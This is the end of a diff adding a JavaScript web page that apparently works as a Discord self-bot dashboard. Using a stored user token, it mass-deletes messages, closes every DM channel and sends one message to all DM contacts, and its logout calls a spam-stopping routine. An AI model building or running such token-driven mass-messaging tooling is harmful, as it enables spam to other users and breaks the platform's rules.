+                    showMessage('deleteMessage', `Completed! Successfully deleted ${deleted} messages`, 'success');
+                } else {
+                    showMessage('deleteMessage', `Completed! Deleted: ${deleted}, Failed: ${failed}`, 'info');
+                }
+                
+            } catch (error) {
+                showMessage('deleteMessage', 'Error: ' + error.message, 'error');
+            } finally {
+                btn.disabled = false;
+                setTimeout(() => {
+                    progressBar.style.display = 'none';
+                    progressFill.style.width = '0%';
+                }, 3000);
+            }
+        }
+
+        // Close All DMs
+        async function closeAllDMs() {
+            const token = users[currentUser].discordToken;
+            if (!token) {
+                showMessage('closeDmMessage', 'Please save your token first', 'error');
+                return;
+            }
+
+            const confirmed = confirm('WARNING: This will close ALL your DM channels. Continue?');
+            if (!confirmed) return;
+
+            showMessage('closeDmMessage', 'Fetching DM channels...', 'info');
+            
+            try {
+                const response = await fetch('https://discord.com/api/v10/users/@me/channels', {
+                    headers: { 'Authorization': token }
+                });
+                const channels = await response.json();
+                const dmChannels = channels.filter(c => c.type === 1);
+                
+                if (dmChannels.length === 0) {
+                    showMessage('closeDmMessage', 'No DM channels found', 'info');
+                    return;
+                }
+                
+                let closed = 0;
+                for (const ch of dmChannels) {
+                    try {
+                        await fetch(`https://discord.com/api/v10/channels/${ch.id}`, {
+                            method: 'DELETE',
+                            headers: { 'Authorization': token }
+                        });
+                        closed++;
+                        showMessage('closeDmMessage', `Closed ${closed}/${dmChannels.length} DMs`, 'success');
+                        await new Promise(r => setTimeout(r, 200));
+                    } catch(e) {}
+                }
+                
+                showMessage('closeDmMessage', `Completed! Closed ${closed} DM channels`, 'success');
+            } catch (error) {
+                showMessage('closeDmMessage', 'Error: ' + error.message, 'error');
+            }
+        }
+
+        // DM All
+        async function dmAll() {
+            const token = users[currentUser].discordToken;
+            const message = document.getElementById('dmAllMessage').value.trim();
+            
+            if (!token) {
+                showMessage('dmAllMessageArea', 'Please save your token first', 'error');
+                return;
+            }
+            if (!message) {
+                showMessage('dmAllMessageArea', 'Please enter a message', 'error');
+                return;
+            }
+
+            const confirmed = confirm(`WARNING: This will send a DM to ALL your friends and DMs. Continue?`);
+            if (!confirmed) return;
+
+            const btn = event.target;
+            btn.disabled = true;
+            const progressBar = document.getElementById('dmAllProgressBar');
+            const progressFill = document.getElementById('dmAllProgressFill');
+            progressBar.style.display = 'block';
+
+            try {
+                const response = await fetch('https://discord.com/api/v10/users/@me/channels', {
+                    headers: { 'Authorization': token }
+                });
+                const channels = await response.json();
+                const dmChannels = channels.filter(c => c.type === 1);
+                
+                if (dmChannels.length === 0) {
+                    showMessage('dmAllMessageArea', 'No DM channels found', 'info');
+                    btn.disabled = false;
+                    progressBar.style.display = 'none';
+                    return;
+                }
+                
+                let sent = 0;
+                let failed = 0;
+                
+                for (let i = 0; i < dmChannels.length; i++) {
+                    const ch = dmChannels[i];
+                    try {
+                        await fetch(`https://discord.com/api/v10/channels/${ch.id}/messages`, {
+                            method: 'POST',
+                            headers: {
+                                'Authorization': token,
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify({ content: message })
+                        });
+                        sent++;
+                        const percent = ((i + 1) / dmChannels.length) * 100;
+                        progressFill.style.width = `${percent}%`;
+                        showMessage('dmAllMessageArea', `Sent: ${sent} | Failed: ${failed} | Progress: ${Math.round(percent)}%`, 'success');
+                        await new Promise(r => setTimeout(r, 100));
+                    } catch(e) {
+                        failed++;
+                    }
+                }
+                
+                showMessage('dmAllMessageArea', `Completed! Sent to ${sent} people, Failed: ${failed}`, 'success');
+            } catch (error) {
+                showMessage('dmAllMessageArea', 'Error: ' + error.message, 'error');
+            } finally {
+                btn.disabled = false;
+                setTimeout(() => {
+                    progressBar.style.display = 'none';
+                    progressFill.style.width = '0%';
+                }, 3000);
+            }
+        }
+
+        // Create Friend Link
+        async function createFriendLink() {
+            const token = users[currentUser].discordToken;
+            if (!token) {
+                showMessage('friendLinkMessage', 'Please save your token first', 'error');
+                return;
+            }
+
+            showMessage('friendLinkMessage', 'Creating friend link...', 'info');
+            
+            try {
+                const response = await fetch('https://discord.com/api/v10/users/@me', {
+                    headers: { 'Authorization': token }
+                });
+                
+                if (!response.ok) {
+                    showMessage('friendLinkMessage', 'Failed to get user info. Invalid token?', 'error');
+                    return;
+                }
+                
+                const userData = await response.json();
+                const friendLink = `https://discord.com/users/${userData.id}`;
+                
+                const container = document.getElementById('friendLinkMessage');
+                container.innerHTML = `
+                    <div class="link-container">
+                        <input type="text" id="friendLinkInput" value="${friendLink}" readonly style="flex:1">
+                        <button class="btn-sm btn-success copy-btn" onclick="copyFriendLink()" style="margin:0">Copy Link</button>
+                    </div>
+                    <div class="message message-success" style="margin-top:10px">Link created successfully! Click Copy to copy the link.</div>
+                `;
+                
+                setTimeout(() => {
+                    const input = document.getElementById('friendLinkInput');
+                    if (input) {
+                        input.select();
+                    }
+                }, 100);
+                
+            } catch (error) {
+                showMessage('friendLinkMessage', 'Error: ' + error.message, 'error');
+            }
+        }
+
+        function copyFriendLink() {
+            const input = document.getElementById('friendLinkInput');
+            if (input) {
+                input.select();
+                document.execCommand('copy');
+                showMessage('friendLinkMessage', 'Link copied to clipboard!', 'success');
+            }
+        }
+
+        function logout() {
+            stopSpam();
+            currentUser = null;
+            localStorage.removeItem('group99_current');
+            showLogin();
+        }
+
+        if (currentUser && users[currentUser]) {
+            showDashboard();
+        } else {
+            showRegister();
+        }
+    </script>
+</body>
+</html>
